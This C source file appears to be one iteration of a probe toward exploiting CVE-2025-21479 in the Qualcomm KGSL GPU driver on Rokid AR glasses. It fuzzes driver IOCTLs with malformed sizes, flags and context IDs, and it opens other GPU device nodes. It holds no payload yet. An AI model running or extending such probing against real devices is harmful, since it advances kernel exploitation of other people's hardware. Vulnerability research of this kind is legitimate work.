/*
 * CVE-2025-21479 GPU Micronode Probe v4 - Timeline & Context Analysis
 * ====================================================================
 *
 * Key findings from v3:
 * - Context creation fails with EINVAL for ALL flag combinations
 * - dmesg shows "legacy context switch not supported"
 * - Timeline IOCTLs exist (0x57-0x5f range)
 * - IOCTL 0x58 returns ret=0 with data
 *
 * This version:
 * 1. Probe all timeline IOCTLs
 * 2. Analyze why context creation fails
 * 3. Try alternative context creation methods
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

// ═══════════════════════════════════════════════════════════════════════════
// KGSL Definitions
// ═══════════════════════════════════════════════════════════════════════════

#define KGSL_IOC_TYPE 0x09

/* Context flags - comprehensive list */
#define KGSL_CONTEXT_SAVE_GMEM 0x00000001
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_SUBMIT_IB_LIST 0x00000004
#define KGSL_CONTEXT_CTX_SWITCH 0x00000008
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_TRASH_STATE 0x00000020
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000040
#define KGSL_CONTEXT_USER_GENERATED_TS 0x00000080
#define KGSL_CONTEXT_END_OF_FRAME 0x00000100
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200
#define KGSL_CONTEXT_SYNC 0x00000400
#define KGSL_CONTEXT_PWR_CONSTRAINT 0x00000800
#define KGSL_CONTEXT_PRIORITY_MASK 0x0000F000
#define KGSL_CONTEXT_PRIORITY_SHIFT 12
#define KGSL_CONTEXT_IFH_NOP 0x00010000
#define KGSL_CONTEXT_SECURE 0x00020000
#define KGSL_CONTEXT_NO_SNAPSHOT 0x00040000
#define KGSL_CONTEXT_SPARSE 0x00080000

/* Context type (bits 20-24) */
#define KGSL_CONTEXT_TYPE_MASK 0x01F00000
#define KGSL_CONTEXT_TYPE_SHIFT 20
#define KGSL_CONTEXT_TYPE_ANY 0
#define KGSL_CONTEXT_TYPE_GL 1
#define KGSL_CONTEXT_TYPE_CL 2
#define KGSL_CONTEXT_TYPE_C2D 3
#define KGSL_CONTEXT_TYPE_RS 4
#define KGSL_CONTEXT_TYPE_VK 5 /* Vulkan - newer */

/* Preempt style (bits 25-27) */
#define KGSL_CONTEXT_PREEMPT_STYLE_MASK 0x0E000000
#define KGSL_CONTEXT_PREEMPT_STYLE_SHIFT 25
#define KGSL_CONTEXT_PREEMPT_STYLE_DEFAULT 0
#define KGSL_CONTEXT_PREEMPT_STYLE_RINGBUFFER 1
#define KGSL_CONTEXT_PREEMPT_STYLE_FINEGRAIN 2

/* LPAC context (bit 28) */
#define KGSL_CONTEXT_LPAC 0x10000000

/* Invalid context marker */
#define KGSL_CONTEXT_INVALID 0xffffffff

// ═══════════════════════════════════════════════════════════════════════════
// Structure Definitions
// ═══════════════════════════════════════════════════════════════════════════

/* Basic drawctxt create */
struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

/* Extended context create (if exists) */
struct kgsl_drawctxt_create_v2
{
    unsigned int flags;
    unsigned int drawctxt_id;
    unsigned int priority;
    unsigned int __pad;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

/* Timeline structures (based on kallsyms findings) */
struct kgsl_timeline_create
{
    uint64_t seqno;
    unsigned int id;
    unsigned int __pad;
};

struct kgsl_timeline_destroy
{
    unsigned int id;
};

struct kgsl_timeline_query
{
    unsigned int id;
    unsigned int count;
    uint64_t seqnos; /* userptr to array */
};

struct kgsl_timeline_signal
{
    unsigned int id;
    unsigned int count;
    uint64_t seqnos; /* userptr to array */
};

struct kgsl_timeline_wait
{
    unsigned int id;
    uint64_t seqno;
    unsigned int timeout_ms;
    unsigned int __pad;
};

struct kgsl_timeline_fence_get
{
    unsigned int id;
    uint64_t seqno;
    int fence_fd;
    unsigned int __pad;
};

/* GPU memory */
struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    unsigned int size;
    unsigned int mmapsize;
    unsigned long gpuaddr;
    unsigned int __pad[2];
};

/* Recurring command */
struct kgsl_recurring_command
{
    unsigned int flags;
    unsigned int cmdlist;
    unsigned int numcmds;
    unsigned int context_id;
};

/* Fault report */
struct kgsl_get_fault_report
{
    uint64_t buf;
    size_t size;
    size_t count;
};

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL Definitions
// ═══════════════════════════════════════════════════════════════════════════

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

#define IOCTL_KGSL_GPUMEM_ALLOC_ID \
    _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)

/* Timeline IOCTLs - mapped from kallsyms order */
#define IOCTL_KGSL_TIMELINE_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x57, struct kgsl_timeline_create)

#define IOCTL_KGSL_TIMELINE_QUERY \
    _IOWR(KGSL_IOC_TYPE, 0x58, struct kgsl_timeline_query)

#define IOCTL_KGSL_TIMELINE_WAIT \
    _IOW(KGSL_IOC_TYPE, 0x59, struct kgsl_timeline_wait)

#define IOCTL_KGSL_TIMELINE_FENCE_GET \
    _IOWR(KGSL_IOC_TYPE, 0x5a, struct kgsl_timeline_fence_get)

#define IOCTL_KGSL_TIMELINE_SIGNAL \
    _IOW(KGSL_IOC_TYPE, 0x5b, struct kgsl_timeline_signal)

#define IOCTL_KGSL_TIMELINE_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x5c, struct kgsl_timeline_destroy)

/* Other IOCTLs */
#define IOCTL_KGSL_RECURRING_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x5d, struct kgsl_recurring_command)

#define IOCTL_KGSL_GET_FAULT_REPORT \
    _IOWR(KGSL_IOC_TYPE, 0x5e, struct kgsl_get_fault_report)

// ═══════════════════════════════════════════════════════════════════════════
// Global State
// ═══════════════════════════════════════════════════════════════════════════

static int kgsl_fd = -1;

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 GPU Micronode Probe v4 - Timeline Analysis    ║\n");
    printf("║  ───────────────────────────────────────────────────────────  ║\n");
    printf("║  Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Deep Context Creation Analysis
// ═══════════════════════════════════════════════════════════════════════════

void analyze_context_creation(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" ANALYSIS: Deep Context Creation Investigation\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Testing extended context creation flags...\n\n");

    /* Try with VK (Vulkan) context type */
    struct
    {
        const char *name;
        unsigned int flags;
    } tests[] = {
        {"Vulkan context", (5 << 20)}, /* KGSL_CONTEXT_TYPE_VK */
        {"Vulkan + preempt", (5 << 20) | (1 << 25)},
        {"LPAC context", 0x10000000},
        {"LPAC + GL", 0x10000000 | (1 << 20)},
        {"Sparse context", 0x00080000},
        {"Sparse + GL", 0x00080000 | (1 << 20)},
        {"Just preempt ringbuffer", (1 << 25)},
        {"Just preempt finegrain", (2 << 25)},
        {"No flags at all", 0x00000000},
        {"Priority 0", (0 << 12)},
        {"Priority 15", (15 << 12)},
        {"All zeros struct", 0x00000000},
    };

    int num_tests = sizeof(tests) / sizeof(tests[0]);
    int success = 0;

    for (int i = 0; i < num_tests; i++)
    {
        struct kgsl_drawctxt_create create = {
            .flags = tests[i].flags,
            .drawctxt_id = 0,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create);

        if (ret == 0)
        {
            printf("[+] SUCCESS: %s (flags=0x%08x)\n", tests[i].name, tests[i].flags);
            printf("    Context ID: %u\n", create.drawctxt_id);
            success++;

            /* Destroy it */
            struct kgsl_drawctxt_destroy destroy = {.drawctxt_id = create.drawctxt_id};
            ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
        }
        else
        {
            printf("[-] FAILED:  %s (flags=0x%08x) - errno=%d\n",
                   tests[i].name, tests[i].flags, errno);
        }
    }

    printf("\n[*] Extended context tests: %d/%d successful\n", success, num_tests);

    /* Try with extended structure */
    printf("\n[*] Trying extended structure (v2)...\n");
    struct kgsl_drawctxt_create_v2 create_v2 = {
        .flags = 0,
        .drawctxt_id = 0,
        .priority = 0,
        .__pad = 0,
    };

    unsigned long ioctl_v2 = _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create_v2);
    int ret = ioctl(kgsl_fd, ioctl_v2, &create_v2);
    printf("    Extended create: ret=%d, errno=%d, id=%u\n",
           ret, errno, create_v2.drawctxt_id);
}

// ═══════════════════════════════════════════════════════════════════════════
// Timeline IOCTL Tests
// ═══════════════════════════════════════════════════════════════════════════

void test_timeline_operations(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Timeline Operations (0x57-0x5c)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Test IOCTL 0x57 - Timeline Create */
    printf("[*] IOCTL 0x57 - Timeline Create\n");
    struct kgsl_timeline_create timeline_create = {
        .seqno = 0,
        .id = 0,
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_CREATE, &timeline_create);
    printf("    Result: ret=%d, errno=%d\n", ret, errno);

    if (ret == 0)
    {
        printf("[+] Timeline Created: ID=%u, Seqno=%llu\n",
               timeline_create.id, (unsigned long long)timeline_create.seqno);

        unsigned int timeline_id = timeline_create.id;

        /* Test Query */
        printf("\n[*] IOCTL 0x58 - Timeline Query\n");
        uint64_t seqnos[4] = {0};
        struct kgsl_timeline_query query = {
            .id = timeline_id,
            .count = 4,
            .seqnos = (uint64_t)seqnos,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_QUERY, &query);
        printf("    Result: ret=%d, errno=%d\n", ret, errno);
        if (ret == 0)
        {
            printf("    Seqnos: %llu, %llu, %llu, %llu\n",
                   (unsigned long long)seqnos[0], (unsigned long long)seqnos[1],
                   (unsigned long long)seqnos[2], (unsigned long long)seqnos[3]);
        }

        /* Test Signal */
        printf("\n[*] IOCTL 0x5b - Timeline Signal\n");
        uint64_t sig_seqnos[1] = {1};
        struct kgsl_timeline_signal signal = {
            .id = timeline_id,
            .count = 1,
            .seqnos = (uint64_t)sig_seqnos,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_SIGNAL, &signal);
        printf("    Result: ret=%d, errno=%d\n", ret, errno);

        /* Test Fence Get */
        printf("\n[*] IOCTL 0x5a - Timeline Fence Get\n");
        struct kgsl_timeline_fence_get fence_get = {
            .id = timeline_id,
            .seqno = 2,
            .fence_fd = -1,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_FENCE_GET, &fence_get);
        printf("    Result: ret=%d, errno=%d\n", ret, errno);
        if (ret == 0)
        {
            printf("    Fence FD: %d\n", fence_get.fence_fd);
            if (fence_get.fence_fd >= 0)
            {
                close(fence_get.fence_fd);
            }
        }

        /* Test Wait */
        printf("\n[*] IOCTL 0x59 - Timeline Wait\n");
        struct kgsl_timeline_wait wait = {
            .id = timeline_id,
            .seqno = 1,
            .timeout_ms = 10,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_WAIT, &wait);
        printf("    Result: ret=%d, errno=%d\n", ret, errno);

        /* Destroy timeline */
        printf("\n[*] IOCTL 0x5c - Timeline Destroy\n");
        struct kgsl_timeline_destroy destroy = {
            .id = timeline_id,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_DESTROY, &destroy);
        printf("    Result: ret=%d, errno=%d\n", ret, errno);
    }
    else
    {
        printf("[-] Timeline creation failed\n");
    }

    /* Test 0x5d - Recurring Command */
    printf("\n[*] IOCTL 0x5d - Recurring Command\n");
    struct kgsl_recurring_command recur = {0};
    ret = ioctl(kgsl_fd, IOCTL_KGSL_RECURRING_COMMAND, &recur);
    printf("    Result: ret=%d, errno=%d\n", ret, errno);

    /* Test 0x5e - Get Fault Report */
    printf("\n[*] IOCTL 0x5e - Get Fault Report\n");
    char fault_buf[4096] = {0};
    struct kgsl_get_fault_report fault = {
        .buf = (uint64_t)fault_buf,
        .size = sizeof(fault_buf),
        .count = 0,
    };
    ret = ioctl(kgsl_fd, IOCTL_KGSL_GET_FAULT_REPORT, &fault);
    printf("    Result: ret=%d, errno=%d, count=%zu\n", ret, errno, fault.count);
    if (ret == 0 && fault.count > 0)
    {
        printf("    [!] Fault reports available!\n");
        printf("    First 64 bytes: ");
        for (int i = 0; i < 64 && i < fault.count; i++)
        {
            printf("%02x ", (unsigned char)fault_buf[i]);
        }
        printf("\n");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL Structure Size Probing
// ═══════════════════════════════════════════════════════════════════════════

void probe_ioctl_structures(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" PROBE: IOCTL Structure Size Analysis\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Probe IOCTL 0x13 (drawctxt_create) with different sizes */
    printf("[*] Probing IOCTL 0x13 (drawctxt_create) with different sizes...\n");

    int sizes[] = {4, 8, 12, 16, 20, 24, 32, 48, 64, 128};
    int num_sizes = sizeof(sizes) / sizeof(sizes[0]);

    for (int i = 0; i < num_sizes; i++)
    {
        char *buf = calloc(1, sizes[i]);
        if (!buf)
            continue;

        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, 0x13, char[128]);
        /* Manually set size in ioctl number */
        ioctl_num = (ioctl_num & ~0x3fff0000) | (sizes[i] << 16);

        int ret = ioctl(kgsl_fd, ioctl_num, buf);

        if (errno != 22)
        { /* Not EINVAL */
            printf("    Size %3d: ret=%d, errno=%d (%s)\n",
                   sizes[i], ret, errno, strerror(errno));
        }

        free(buf);
    }

    /* Try raw buffer approach */
    printf("\n[*] Trying raw buffer with pre-filled flags...\n");
    for (unsigned int flag_val = 0; flag_val <= 0x10000000; flag_val += 0x100000)
    {
        unsigned char buf[32] = {0};
        *(unsigned int *)buf = flag_val; /* flags */

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, buf);

        if (ret == 0)
        {
            printf("[+] SUCCESS with flags=0x%08x!\n", flag_val);
            printf("    Returned ID: %u\n", *(unsigned int *)(buf + 4));

            /* Destroy */
            unsigned int id = *(unsigned int *)(buf + 4);
            struct kgsl_drawctxt_destroy destroy = {.drawctxt_id = id};
            ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
            break;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Command Without Context (Edge Case)
// ═══════════════════════════════════════════════════════════════════════════

void test_contextless_operations(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Context-less GPU Operations\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Allocate GPU memory first */
    struct kgsl_gpumem_alloc_id alloc = {
        .flags = 0,
        .size = 4096,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) < 0)
    {
        printf("[-] GPU memory allocation failed\n");
        return;
    }

    printf("[+] GPU memory allocated: ID=%u, gpuaddr=0x%lx\n",
           alloc.id, alloc.gpuaddr);

    /* Try IOCTL 0x4A (GPU_COMMAND) with context_id = 0 */
    printf("\n[*] Testing GPU_COMMAND with context_id variations...\n");

    unsigned int ctx_ids[] = {0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF};
    int num_ids = sizeof(ctx_ids) / sizeof(ctx_ids[0]);

    for (int i = 0; i < num_ids; i++)
    {
        /* Build GPU command structure */
        struct
        {
            uint64_t flags;
            uint64_t cmdlist;
            uint64_t cmdsize;
            uint64_t objlist;
            uint64_t objsize;
            uint64_t synclist;
            uint64_t syncsize;
            unsigned int context_id;
            unsigned int numcmds;
            unsigned int numobjs;
            unsigned int numsyncs;
            unsigned int timestamp;
            unsigned int cmdlist_size;
            unsigned int objlist_size;
            unsigned int synclist_size;
        } gpu_cmd = {0};

        gpu_cmd.context_id = ctx_ids[i];
        gpu_cmd.cmdlist = alloc.gpuaddr;
        gpu_cmd.cmdsize = 64;
        gpu_cmd.numcmds = 0;

        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, 0x4A, typeof(gpu_cmd));
        int ret = ioctl(kgsl_fd, ioctl_num, &gpu_cmd);

        /* Check for non-EINVAL responses */
        if (errno != 22)
        {
            printf("    ctx_id=0x%08x: ret=%d, errno=%d (%s)\n",
                   ctx_ids[i], ret, errno, strerror(errno));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Check Other GPU Nodes
// ═══════════════════════════════════════════════════════════════════════════

void check_other_gpu_nodes(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" CHECK: Other GPU Device Nodes\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    const char *nodes[] = {
        "/dev/kgsl-3d0",
        "/dev/dri/card0",
        "/dev/dri/renderD128",
        "/dev/dri/controlD64",
        "/dev/ion",
        "/dev/mali0",
        "/dev/pvr_sync",
    };

    int num_nodes = sizeof(nodes) / sizeof(nodes[0]);

    for (int i = 0; i < num_nodes; i++)
    {
        int fd = open(nodes[i], O_RDWR);
        if (fd >= 0)
        {
            struct stat st;
            fstat(fd, &st);
            printf("[+] %s: OPEN (mode=%o)\n", nodes[i], st.st_mode & 0777);
            close(fd);
        }
        else
        {
            printf("[-] %s: %s\n", nodes[i], strerror(errno));
        }
    }

    /* Check DRM version on card0 */
    int drm_fd = open("/dev/dri/card0", O_RDWR);
    if (drm_fd >= 0)
    {
        printf("\n[*] DRM device opened, probing IOCTLs...\n");

        /* DRM_IOCTL_VERSION = 0xC0106400 on ARM64 */
        struct
        {
            int version_major;
            int version_minor;
            int version_patchlevel;
            size_t name_len;
            char *name;
            size_t date_len;
            char *date;
            size_t desc_len;
            char *desc;
        } drm_version = {0};

        char name[128] = {0};
        char date[128] = {0};
        char desc[256] = {0};

        drm_version.name = name;
        drm_version.name_len = sizeof(name) - 1;
        drm_version.date = date;
        drm_version.date_len = sizeof(date) - 1;
        drm_version.desc = desc;
        drm_version.desc_len = sizeof(desc) - 1;

        /* Try DRM_IOCTL_VERSION */
        unsigned long drm_version_ioctl = 0xC0406400; /* _IOWR('d', 0, ...) */

        if (ioctl(drm_fd, drm_version_ioctl, &drm_version) == 0)
        {
            printf("    DRM Version: %d.%d.%d\n",
                   drm_version.version_major,
                   drm_version.version_minor,
                   drm_version.version_patchlevel);
            printf("    Driver: %s\n", name);
            printf("    Date: %s\n", date);
            printf("    Desc: %s\n", desc);
        }
        else
        {
            printf("    DRM VERSION ioctl failed: %s\n", strerror(errno));
        }

        close(drm_fd);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    print_banner();

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    /* Open KGSL device */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    /* Run tests */
    analyze_context_creation();
    test_timeline_operations();
    probe_ioctl_structures();
    test_contextless_operations();
    check_other_gpu_nodes();

    close(kgsl_fd);

    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" Probe Complete\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    return 0;
}
